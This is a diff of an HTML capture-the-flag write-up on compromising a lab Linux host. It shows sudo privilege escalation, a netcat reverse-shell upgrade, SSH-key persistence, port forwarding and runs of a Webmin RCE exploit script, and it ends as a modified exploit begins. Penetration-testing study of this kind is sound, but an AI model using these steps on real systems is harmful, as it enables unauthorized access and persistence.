+drwxr-xr-x <span style="color:#bd93f9">4</span> dwight dwight <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">8</span> <span style="color:#bd93f9">2020</span> ..
+$ sudo -l
+Matching Defaults entries <span style="color:#ff79c6">for</span> www-data on office:
+env_reset, mail_badpass,
+<span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
+
+User www-data may run the following commands on office:
+<span style="color:#ff79c6">(</span>dwight<span style="color:#ff79c6">)</span> NOPASSWD: /bin/bash
+$ sudo -u dwight /bin/bash
+whoami
+dwight
+</code></pre></td></tr></table>
 </div>
 </div><p>#upgrade shell</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#f1fa8c">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm-256color
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>/bin/bash
-</span></span><span style="display:flex;"><span>^Z
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> + <span style="color:#bd93f9">58885</span> suspended rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
-</span></span><span style="display:flex;"><span>stty raw -echo;<span style="color:#8be9fd;font-style:italic">fg</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> - <span style="color:#bd93f9">58885</span> continued rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
-</span></span><span style="display:flex;"><span>reset
-</span></span><span style="display:flex;"><span>stty rows <span style="color:#bd93f9">47</span> columns <span style="color:#bd93f9">158</span>
-</span></span><span style="display:flex;"><span>dwight@office:/var/www/html/wordpress$
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#f1fa8c">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm-256color
+<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>/bin/bash
+^Z
+<span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> + <span style="color:#bd93f9">58885</span> suspended rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
+stty raw -echo;<span style="color:#8be9fd;font-style:italic">fg</span>
+<span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> - <span style="color:#bd93f9">58885</span> continued rlwrap nc -lnvp <span style="color:#bd93f9">1337</span>
+reset
+stty rows <span style="color:#bd93f9">47</span> columns <span style="color:#bd93f9">158</span>
+dwight@office:/var/www/html/wordpress$
+</code></pre></td></tr></table>
 </div>
 </div><p>#upload ssh pub key</p>
 <pre tabindex="0"><code>cd /home/dwight
 cd .ssh
 ls -la
 </code></pre><p>the directory is empty</p>
-<pre tabindex="0"><code>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkkUxb1mCROdgnSU3yU9ICmf+/3cZGSpEXMgsR0ZpvFDWqzUNLZDIxwTdWAZlfazKPLOrgjD2G++mmq4HgdQ0NqbZnGk4TvguCHcZVeQdpb2ZgRDPB0nxe7D7DCW6DqzPzsqNwSLB73IIt29Pv5n+T71a4FEc2ydiiJyDKYTC6IceGI567cwIqZ4bSE/mViVM4awdtaAznFOL9GwTCNqjEUrjZDOXjV8dHAWPLZfm7dZ9iC0orIC8pMaAF8kfkfo+6PFmB83gxLO1Nrjmx0n2lhoQpfa9QJT0cl9LODAKUSwcHj+gGWHbD1SNvOKSUBvFlkijU4P8G4M0Ea6rKWP6hJL5yvrszkCdfNvznq9EmpYPxd+2fiHzJucffV0K7r0say1Q77pXnd9SNuM4yqb0QBXYxSrGYB9MDXAT24P3IzjDCc9NkKy3OjryQPZkVnMZO/MFxaZenhpcoAOgCRqdzf9DtbCv5ANE0gj/kZgEpnahcw757sE21wGLL2HGzSvk= ctf@87004a0dcb62&#34; &gt;&gt; authorized_keys
+<pre tabindex="0"><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkkUxb1mCROdgnSU3yU9ICmf+/3cZGSpEXMgsR0ZpvFDWqzUNLZDIxwTdWAZlfazKPLOrgjD2G++mmq4HgdQ0NqbZnGk4TvguCHcZVeQdpb2ZgRDPB0nxe7D7DCW6DqzPzsqNwSLB73IIt29Pv5n+T71a4FEc2ydiiJyDKYTC6IceGI567cwIqZ4bSE/mViVM4awdtaAznFOL9GwTCNqjEUrjZDOXjV8dHAWPLZfm7dZ9iC0orIC8pMaAF8kfkfo+6PFmB83gxLO1Nrjmx0n2lhoQpfa9QJT0cl9LODAKUSwcHj+gGWHbD1SNvOKSUBvFlkijU4P8G4M0Ea6rKWP6hJL5yvrszkCdfNvznq9EmpYPxd+2fiHzJucffV0K7r0say1Q77pXnd9SNuM4yqb0QBXYxSrGYB9MDXAT24P3IzjDCc9NkKy3OjryQPZkVnMZO/MFxaZenhpcoAOgCRqdzf9DtbCv5ANE0gj/kZgEpnahcw757sE21wGLL2HGzSvk= ctf@87004a0dcb62&quot; &gt;&gt; authorized_keys
 chmod 600 authorized_keys
 </code></pre><h1 id="establish-ssh-connexion">Establish ssh connexion</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa_cyberseclabs dwight@172.31.3.1
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>dwight@office:~$
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i ~/.ssh/id_rsa_cyberseclabs dwight@172.31.3.1
+<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
+dwight@office:~$
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="exploration-1">Exploration</h1>
 <p>We can find an interesting process which seems to be a server:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps -eaf
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>root <span style="color:#bd93f9">1066</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span> 21:41 ? 00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps -eaf
+<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
+root <span style="color:#bd93f9">1066</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span> 21:41 ? 00:00:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
+</code></pre></td></tr></table>
 </div>
 </div><p>webmin server is running locally on port 10000, but we don&rsquo;t know which version.
 It could be a vulnerable version as per <code>searchsploit webmin</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dwight@office:~$ ss -lntp
-</span></span><span style="display:flex;"><span>State Recv-Q Send-Q Local Address:Port Peer Address:Port
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:10000 0.0.0.0:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 127.0.0.53%lo:53 0.0.0.0:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:22 0.0.0.0:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">80</span> 127.0.0.1:3306 0.0.0.0:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:80 _:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:22 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:_
-</span></span><span style="display:flex;"><span>LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:443 _:<span style="color:#f1fa8c">\*</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dwight@office:~$ ss -lntp
+State Recv-Q Send-Q Local Address:Port Peer Address:Port
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:10000 0.0.0.0:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 127.0.0.53%lo:53 0.0.0.0:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:22 0.0.0.0:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">80</span> 127.0.0.1:3306 0.0.0.0:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:80 _:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:22 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:_
+LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> _:443 _:<span style="color:#f1fa8c">\*</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><code>curl -k http://localhost:10000</code> shows we have an http server running webmin.
 We can reconnect ssh and forward port 10000 locally</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa_cyberseclabs -L 10000:localhost:8100 dwight@172.31.3.1
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i ~/.ssh/id_rsa_cyberseclabs -L 10000:localhost:8100 dwight@172.31.3.1
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="poc---exploitation">PoC - Exploitation</h1>
 <pre tabindex="0"><code>searchsploit webmin
 [..]
 Webmin 1.920 - Remote Code Execution | linux/webapps/47293.sh
 </code></pre><p>The exploit on this <a href="https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html">blogpost</a> fails</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /opt/exploitdb/exploits/linux/webapps/47293.sh .
-</span></span><span style="display:flex;"><span>chmod u+x 47293.sh
-</span></span><span style="display:flex;"><span>dos2unix 47293.sh
-</span></span><span style="display:flex;"><span>sh ./47293.sh http://localhost:8100
-</span></span><span style="display:flex;"><span>Testing <span style="color:#ff79c6">for</span> RCE <span style="color:#ff79c6">(</span>CVE-2019-15107<span style="color:#ff79c6">)</span> on http://localhost:8100: OK! <span style="color:#ff79c6">(</span>target is not vulnerable<span style="color:#ff79c6">)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp /opt/exploitdb/exploits/linux/webapps/47293.sh .
+chmod u+x 47293.sh
+dos2unix 47293.sh
+sh ./47293.sh http://localhost:8100
+Testing <span style="color:#ff79c6">for</span> RCE <span style="color:#ff79c6">(</span>CVE-2019-15107<span style="color:#ff79c6">)</span> on http://localhost:8100: OK! <span style="color:#ff79c6">(</span>target is not vulnerable<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Looking at the response header we find: <code>Server: MiniServ/1.890</code>,
 a simple google search helps find this python <a href="https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py">github exploit</a></p>
 <h1 id="modify-the-exploit">Modify the exploit</h1>
 <p>webmin1890.py</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
